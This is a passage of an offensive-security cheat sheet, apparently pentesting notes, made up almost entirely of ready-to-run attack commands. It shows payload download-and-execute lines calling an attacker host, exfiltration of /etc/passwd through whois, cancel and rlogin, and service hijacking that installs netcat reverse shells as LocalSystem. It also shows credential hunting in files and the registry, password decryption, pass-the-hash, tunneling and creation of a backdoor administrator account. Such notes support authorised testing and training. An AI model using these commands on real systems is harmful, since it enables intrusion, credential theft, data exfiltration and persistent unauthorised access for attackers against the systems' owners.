scp<span class="w"> </span>~/file/file.bin<span class="w"> </span>user@<span class="nv">$TARGET</span>:tmp/backdoor.py
</code></pre></div>
<h4 id="netcat">NetCat</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Attacker</span>
nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&lt;<span class="w"> </span>/tool/file.exe

<span class="c1"># Victim</span>
nc<span class="w"> </span><span class="nv">$ATTACKER</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;<span class="w"> </span>file.exe
</code></pre></div>
<h4 id="http-windows-debugexe-method">HTTP: Windows "debug.exe" Method</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># 1. In Linux, convert binary to hex ascii:</span>
wine<span class="w"> </span>/usr/share/windows-binaries/exe2bat.exe<span class="w"> </span>/root/tools/netcat/nc.exe<span class="w"> </span>nc.txt
<span class="c1"># 2. Paste nc.txt into Windows Shell.</span>
</code></pre></div>
<h4 id="http-windows-bitsadmin">HTTP: Windows BitsAdmin</h4>
<div class="highlight"><pre><span></span><code>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">&quot;bitsadmin /transfer myjob /download /priority high http://</span><span class="nv">$ATTACKER</span><span class="s2">/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe</span>
</code></pre></div>
<h4 id="wscript-script-code-download-execution">Wscript Script Code Download &amp; Execution</h4>
<p>{% tabs %}
{% tab title="cmd" %}
<div class="highlight"><pre><span></span><code>echo GetObject(&quot;script:https://bad.com/code.js&quot;) &gt; code.js &amp;&amp; wscript.exe code.js
</code></pre></div>
{% endtab %}</p>
<p>{% tab title="code.js" %}
<div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;package&gt;
&lt;component id=&quot;PopCalc&quot;&gt;
&lt;script language=&quot;JScript&quot;&gt;
    &lt;![CDATA[
    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;); 
    ]]&gt;
&lt;/script&gt;
&lt;/component&gt;
&lt;/package&gt;
</code></pre></div>
{% endtab %}
{% endtabs %}</p>
<h3 id="whois-data-exfiltration">Whois Data Exfiltration</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># attacker</span>
nc<span class="w"> </span>-l<span class="w"> </span>-v<span class="w"> </span>-p<span class="w"> </span><span class="m">43</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s2">&quot;s/ //g&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
<span class="c1"># victim</span>
whois<span class="w"> </span>-h<span class="w"> </span><span class="nv">$attackerIP</span><span class="w"> </span>-p<span class="w"> </span><span class="m">43</span><span class="w"> </span><span class="sb">`</span>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="sb">`</span>
</code></pre></div>
<h3 id="cancel-data-exfiltration">Cancel Data Exfiltration</h3>
<div class="highlight"><pre><span></span><code>cancel<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>cat<span class="w"> </span>/etc/passwd<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span>-h<span class="w"> </span>ip:port
</code></pre></div>
<h3 id="rlogin-data-exfiltration">rlogin Data Exfiltration</h3>
<div class="highlight"><pre><span></span><code>rlogin<span class="w"> </span>-l<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>cat<span class="w"> </span>/etc/passwd<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span>port<span class="w"> </span>host
</code></pre></div>
<h3 id="bash-ping-sweeper">Bash Ping Sweeper</h3>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="k">for</span><span class="w"> </span>lastOctet<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..254<span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>
<span class="w">    </span>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">10</span>.0.0.<span class="nv">$lastOctet</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;bytes from&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot; &quot;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;:&quot;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">&amp;</span>
<span class="k">done</span>
</code></pre></div>
<h3 id="brute-forcing-xored-string-with-1-byte-key-in-python">Brute-forcing XOR'ed string with 1 byte key in Python</h3>
<div class="highlight"><pre><span></span><code><span class="n">encrypted</span> <span class="o">=</span> <span class="s2">&quot;encrypted-string-here&quot;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">255</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">encrypted</span><span class="p">]))</span>
</code></pre></div>
<h3 id="generating-bad-character-strings">Generating Bad Character Strings</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Python</span>
<span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="s2">&quot;x</span><span class="si">{:02x}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)</span> <span class="p">])</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c1"># Bash</span>
<span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..255<span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;\\\x%02x&quot;</span><span class="w"> </span><span class="nv">$i</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\r&quot;</span>
</code></pre></div>
<h3 id="converting-python-to-windows-executable-py-exe">Converting Python to Windows Executable (.py -&gt; .exe)</h3>
<div class="highlight"><pre><span></span><code><span class="n">python</span><span class="w"> </span><span class="n">pyinstaller</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">--</span><span class="n">onefile</span><span class="w"> </span><span class="n">convert</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">exe</span><span class="p">.</span><span class="n">py</span>
</code></pre></div>
<h3 id="port-scanning-with-netcat">Port Scanning with NetCat</h3>
<div class="highlight"><pre><span></span><code><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nvv</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">-</span><span class="n">z</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="m">1000</span><span class="o">-</span><span class="m">2000</span>
<span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nv</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">-</span><span class="n">z</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="m">160</span><span class="o">-</span><span class="m">162</span>
</code></pre></div>
<h3 id="port-scanning-with-masscan">Port Scanning with Masscan</h3>
<div class="highlight"><pre><span></span><code><span class="n">masscan</span><span class="w"> </span><span class="o">-</span><span class="n">p1</span><span class="o">-</span><span class="mi">65535</span><span class="p">,</span><span class="nv">U</span><span class="p">:</span><span class="mi">1</span><span class="o">-</span><span class="mi">65535</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="n">x</span><span class="w"> </span><span class="o">--</span><span class="n">rate</span><span class="o">=</span><span class="mi">1000</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">tun0</span>
</code></pre></div>
<h3 id="exploiting-vulnerable-windows-services-weak-service-permissions">Exploiting Vulnerable Windows Services: Weak Service Permissions</h3>
<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">Look</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">SERVICE_ALL_ACCESS</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">output</span>
<span class="n">accesschk</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">/</span><span class="n">accepteula</span><span class="w"> </span><span class="o">-</span><span class="n">uwcqv</span><span class="w"> </span><span class="s">&quot;Authenticated Users&quot;</span><span class="w"> </span><span class="o">*</span>

<span class="n">sc</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="p">[</span><span class="n">service_name</span><span class="p">]</span><span class="w"> </span><span class="n">binpath</span><span class="o">=</span><span class="w"> </span><span class="s">&quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot;</span><span class="w"> </span><span class="n">obj</span><span class="o">=</span><span class="w"> </span><span class="s">&quot;LocalSystem&quot;</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span>
<span class="n">sc</span><span class="w"> </span><span class="n">qc</span><span class="w"> </span><span class="p">[</span><span class="n">service_name</span><span class="p">]</span><span class="w"> </span><span class="p">(</span><span class="n">to</span><span class="w"> </span><span class="n">verify</span><span class="o">!</span><span class="p">)</span>
<span class="n">sc</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="p">[</span><span class="n">service_name</span><span class="p">]</span>
</code></pre></div>
<h3 id="find-filefolder-permissions-explicitly-set-for-a-given-user">Find File/Folder Permissions Explicitly Set for a Given User</h3>
<div class="highlight"><pre><span></span><code><span class="n">icacls</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">folder</span><span class="w"> </span><span class="o">/</span><span class="n">findsid</span><span class="w"> </span><span class="n">userName</span><span class="o">-</span><span class="n">or</span><span class="o">-*</span><span class="n">sid</span><span class="w"> </span><span class="o">/</span><span class="n">t</span>
<span class="c1">//look for (F)ull, (M)odify, (W)rite</span>
</code></pre></div>
<h3 id="alwaysinstallelevated-msi">AlwaysInstallElevated MSI</h3>
<div class="highlight"><pre><span></span><code><span class="n">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">HKCU</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Installer</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">AlwaysInstallElevated</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Installer</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">AlwaysInstallElevated</span>
</code></pre></div>
<h3 id="stored-credentials-windows">Stored Credentials: Windows</h3>
<div class="highlight"><pre><span></span><code><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="n">unattend</span><span class="p">.</span><span class="n">xml</span>
<span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">inf</span>
<span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="n">sysprep</span><span class="err">\</span><span class="n">sysprep</span><span class="p">.</span><span class="n">xml</span>
<span class="n">dir</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="o">*</span><span class="n">vnc</span><span class="p">.</span><span class="n">ini</span><span class="w"> </span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">b</span>
<span class="n">dir</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="o">*</span><span class="n">ultravnc</span><span class="p">.</span><span class="n">ini</span><span class="w"> </span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">b</span><span class="w"> </span>
<span class="n">dir</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">b</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">si</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="p">.</span><span class="n">ini</span>

<span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">si</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">xml</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">ini</span>
<span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">si</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">xml</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">ini</span>
<span class="n">dir</span><span class="w"> </span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="o">*</span><span class="n">cred</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">pass</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">conf</span>

<span class="err">#</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Autologon</span>
<span class="n">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="s">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span>

<span class="err">#</span><span class="w"> </span><span class="n">VNC</span>
<span class="n">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="s">&quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span>

<span class="err">#</span><span class="w"> </span><span class="n">Putty</span>
<span class="n">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="s">&quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span>

<span class="err">#</span><span class="w"> </span><span class="n">Registry</span>
<span class="n">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">HKLM</span><span class="w"> </span><span class="o">/</span><span class="n">f</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_SZ</span><span class="w"> </span><span class="o">/</span><span class="n">s</span><span class="w"> </span>
<span class="n">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">HKCU</span><span class="w"> </span><span class="o">/</span><span class="n">f</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_SZ</span><span class="w"> </span><span class="o">/</span><span class="n">s</span>
</code></pre></div>
<h3 id="unquoted-service-path">Unquoted Service Path</h3>
<div class="highlight"><pre><span></span><code><span class="n">wmic</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="s">&quot;auto&quot;</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="s">&quot;c:\windows\\&quot;</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="s">&quot;&quot;&quot;</span>
<span class="n">wmic</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="s">&quot;C:\Windows\\&quot;</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="s">&quot;&quot;&quot;</span>
</code></pre></div>
<h3 id="persistence-via-services">Persistence via Services</h3>
<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">cmd</span>
<span class="n">sc</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">spotlessSrv</span><span class="w"> </span><span class="n">binpath</span><span class="o">=</span><span class="w"> </span><span class="s">&quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot;</span><span class="w"> </span><span class="n">obj</span><span class="o">=</span><span class="w"> </span><span class="s">&quot;LocalSystem&quot;</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span>

<span class="err">#</span><span class="w"> </span><span class="n">powersehll</span>
<span class="n">New</span><span class="o">-</span><span class="n">Service</span><span class="w"> </span><span class="o">-</span><span class="n">Name</span><span class="w"> </span><span class="n">EvilName</span><span class="w"> </span><span class="o">-</span><span class="n">DisplayName</span><span class="w"> </span><span class="n">EvilSvc</span><span class="w"> </span><span class="o">-</span><span class="n">BinaryPathName</span><span class="w"> </span><span class="s">&quot;&#39;C:\Program Files\NotEvil\back.exe&#39;&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">Description</span><span class="w"> </span><span class="s">&quot;Not at all&quot;</span>
</code></pre></div>
<h3 id="port-forwarding-ssh-tunneling">Port Forwarding / SSH Tunneling</h3>
<h4 id="ssh-local-port-forwarding">SSH: Local Port Forwarding</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER</span>
<span class="c1"># Scenario: access a host that&#39;s being blocked by a firewall via SSH_SERVER;</span>
ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">127</span>.0.0.1:8080:REMOTE_HOST:PORT<span class="w"> </span>user@SSH_SERVER
</code></pre></div>
<h4 id="ssh-dynamic-port-forwarding">SSH: Dynamic Port Forwarding</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER</span>
<span class="c1"># Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;</span>
ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">127</span>.0.0.1:8080<span class="w"> </span>user@SSH_SERVER
</code></pre></div>
<h4 id="ssh-remote-port-forwarding">SSH: Remote Port Forwarding</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389</span>
<span class="c1"># Scenario: expose RDP on non-routable network;</span>
ssh<span class="w"> </span>-R<span class="w"> </span><span class="m">5555</span>:LOCAL_HOST:3389<span class="w"> </span>user@SSH_SERVER
plink<span class="w"> </span>-R<span class="w"> </span>ATTACKER:ATTACKER_PORT:127.0.01:80<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-pw<span class="w"> </span>pw<span class="w"> </span>ATTACKER_IP
</code></pre></div>
<h4 id="proxy-tunnel">Proxy Tunnel</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128</span>
<span class="c1"># Scenario: a remote host has SSH running, but it&#39;s only bound to 127.0.0.1, but you want to reach it;</span>
proxytunnel<span class="w"> </span>-p<span class="w"> </span>PROXY_HOST:3128<span class="w"> </span>-d<span class="w"> </span>DESTINATION_HOST:22<span class="w"> </span>-a<span class="w"> </span><span class="m">5555</span>
ssh<span class="w"> </span>user@127.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">5555</span>
</code></pre></div>
<h4 id="http-tunnel-ssh-over-http">HTTP Tunnel: SSH Over HTTP</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22</span>
hts<span class="w"> </span>-F<span class="w"> </span>localhost:22<span class="w"> </span><span class="m">80</span>

<span class="c1"># Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80</span>
htc<span class="w"> </span>-F<span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="m">192</span>.168.1.15:80

<span class="c1"># Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22</span>
ssh<span class="w"> </span>localhost<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span>
</code></pre></div>
<h4 id="netsh-windows-port-forwarding">Netsh - Windows Port Forwarding</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># requires admin</span>
netsh<span class="w"> </span>interface<span class="w"> </span>portproxy<span class="w"> </span>add<span class="w"> </span>v4tov4<span class="w"> </span><span class="nv">listenaddress</span><span class="o">=</span>localaddress<span class="w"> </span><span class="nv">listenport</span><span class="o">=</span>localport<span class="w"> </span><span class="nv">connectaddress</span><span class="o">=</span>destaddress<span class="w"> </span><span class="nv">connectport</span><span class="o">=</span>destport
</code></pre></div>
<h3 id="runas-start-process-as">RunAs / Start Process As</h3>
<h4 id="powershell">PowerShell</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Requires PSRemoting</span>
<span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Administrator&#39;</span><span class="p">;</span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1234test&#39;</span><span class="p">;</span><span class="nv">$securePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ConvertTo-SecureString<span class="w"> </span><span class="nv">$password</span><span class="w"> </span>-AsPlainText<span class="w"> </span>-Force<span class="p">;</span><span class="nv">$credential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Management.Automation.PSCredential<span class="w"> </span><span class="nv">$username</span>,<span class="w"> </span><span class="nv">$securePassword</span><span class="p">;</span>Invoke-Command<span class="w"> </span>-Credential<span class="w"> </span><span class="nv">$credential</span><span class="w"> </span>-ComputerName<span class="w"> </span>COMPUTER_NAME<span class="w"> </span>-Command<span class="w"> </span><span class="o">{</span><span class="w"> </span>whoami<span class="w"> </span><span class="o">}</span>

<span class="c1"># without PSRemoting</span>
cmd&gt;<span class="w"> </span>powershell<span class="w"> </span>Start-Process<span class="w"> </span>cmd.exe<span class="w"> </span>-Credential<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>System.Management.Automation.PSCredential<span class="w"> </span><span class="s1">&#39;username&#39;</span>,<span class="w"> </span><span class="o">(</span>ConvertTo-SecureString<span class="w"> </span><span class="s1">&#39;password&#39;</span><span class="w"> </span>-AsPlainText<span class="w"> </span>-Force<span class="o">))</span>

<span class="c1"># without PS Remoting, with arguments</span>
cmd&gt;<span class="w"> </span>powershell<span class="w"> </span>-command<span class="w"> </span><span class="s2">&quot;start-process cmd.exe -argumentlist &#39;/c calc&#39; -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;,(ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))&quot;</span>
</code></pre></div>
<h4 id="cmd">CMD</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Requires interactive console</span>
runas<span class="w"> </span>/user:userName<span class="w"> </span>cmd.exe
</code></pre></div>
<h4 id="psexec">PsExec</h4>
<div class="highlight"><pre><span></span><code><span class="n">psexec</span><span class="w"> </span><span class="o">-</span><span class="n">accepteula</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">/</span><span class="n">c</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="m">10.11</span><span class="p">.</span><span class="m">0.245</span><span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
</code></pre></div>
<h4 id="pth-winexe">Pth-WinExe</h4>
<div class="highlight"><pre><span></span><code><span class="n">pth</span><span class="o">-</span><span class="n">winexe</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">user</span><span class="o">%</span><span class="n">pass</span><span class="w"> </span><span class="o">--</span><span class="n">runas</span><span class="o">=</span><span class="n">user</span><span class="o">%</span><span class="n">pass</span><span class="w"> </span><span class="c1">//10.1.1.1 cmd.exe</span>
</code></pre></div>
<h3 id="recursively-find-hidden-files-windows">Recursively Find Hidden Files: Windows</h3>
<div class="highlight"><pre><span></span><code>dir<span class="w"> </span>/A:H<span class="w"> </span>/s<span class="w"> </span><span class="s2">&quot;c:\program files&quot;</span>
</code></pre></div>
<h3 id="general-file-search">General File Search</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Query the local db for a quick file find. Run updatedb before executing locate.</span>
locate<span class="w"> </span>passwd<span class="w"> </span>

<span class="c1"># Show which file would be executed in the current environment, depending on $PATH environment variable;</span>
which<span class="w"> </span>nc<span class="w"> </span>wget<span class="w"> </span>curl<span class="w"> </span>php<span class="w"> </span>perl<span class="w"> </span>python<span class="w"> </span>netcat<span class="w"> </span>tftp<span class="w"> </span>telnet<span class="w"> </span>ftp

<span class="c1"># Search for *.conf (case-insensitive) files recursively starting with /etc;</span>
find<span class="w"> </span>/etc<span class="w"> </span>-iname<span class="w"> </span>*.conf
</code></pre></div>
<h2 id="post-exploitation-maintaining-access">Post-Exploitation &amp; Maintaining Access</h2>
<h3 id="browsing-registry-hives">Browsing Registry Hives</h3>
<div class="highlight"><pre><span></span><code>hivesh<span class="w"> </span>/registry/file
</code></pre></div>
<h3 id="decrypting-rdg-passwords">Decrypting RDG Passwords</h3>
<p>Remote Desktop Connection Manager passwords can be decrypted on the same computer/account they were encrypted:</p>
<div class="highlight"><pre><span></span><code>Copy-Item &#39;C:\Program Files (x86)\Microsoft\Remote Desktop Connection Manager\RDCMan.exe C:\temp\RDCMan.dll
Import-Module C:\temp\RDCMan.dll
$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
[RdcMan.Encryption]::DecryptString($PwdString, $EncryptionSettings)
</code></pre></div>
<h3 id="decrypting-vnc-password">Decrypting VNC Password</h3>
<div class="highlight"><pre><span></span><code>wine<span class="w"> </span>vncpwdump.exe<span class="w"> </span>-k<span class="w"> </span>key
</code></pre></div>
<h3 id="creating-user-and-adding-to-local-administrators">Creating User and Adding to Local Administrators</h3>
<div class="highlight"><pre><span></span><code>net<span class="w"> </span>user<span class="w"> </span>spotless<span class="w"> </span>spotless<span class="w"> </span>/add<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>net<span class="w"> </span>localgroup<span class="w"> </span>Administrators<span class="w"> </span>spotless<span class="w"> </span>/add
</code></pre></div>
<h3 id="hide-newly-created-local-administrator">Hide Newly Created Local administrator</h3>
